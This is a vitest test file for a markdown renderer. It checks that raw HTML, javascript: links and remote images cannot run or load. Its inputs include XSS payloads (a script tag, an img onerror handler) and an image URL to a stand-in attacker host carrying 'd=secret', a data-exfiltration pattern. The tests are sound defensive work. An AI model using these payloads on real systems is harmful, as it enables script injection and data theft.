import { describe, it, expect } from "vitest";
import { mdRender } from "./markdown.js";

describe("markdown: nothing in a result can run or send data out", () => {
  it("shows raw HTML as text", () => {
    const h = mdRender('<script>alert(1)</script> <img src=x onerror="alert(1)">');
    expect(h).not.toContain("<script");
    expect(h).not.toContain("<img");
  });
  it("blocks javascript: links", () => {
    expect(mdRender("[x](javascript:alert(1))")).toContain('href="#"');
  });
  it("turns images from other sites into links, not loaded", () => {
    const h = mdRender("![chart](https://evil.example/p.png?d=secret) ![x](//evil.example/a.png)");
    expect(h).not.toContain("<img");
    expect(h).toContain('class="md-remote-img"');
    expect(h).toContain("evil.example");
  });
  it("keeps data and project images", () => {
    const h = mdRender("![a](data:image/png;base64,AAA) ![b](out/chart.png)");
    expect((h.match(/<img /g) || []).length).toBe(2);
  });
});
